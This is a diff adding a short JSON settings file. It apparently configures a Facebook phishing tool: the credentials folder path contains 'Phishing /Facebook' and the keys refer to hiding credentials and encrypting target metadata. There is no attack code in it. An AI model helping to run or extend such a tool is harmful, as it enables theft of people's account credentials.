@@ -1,0 +1,12 @@
+{
+  "debug_mode": false,
+  "credentials_folder": "/home/paul/Bureau/Mes appli/Phishing /Facebook/V5/V13/MetaCloud_modular/credentials_json",
+  "hide_names": false,
+  "hide_credentials": true,
+  "theme_color": "red",
+  "encrypt_files": true,
+  "encrypt_credentials_txt": false,
+  "encrypt_global_settings": false,
+  "encrypt_targets_meta": false,
+  "notifications_enabled": true
+}
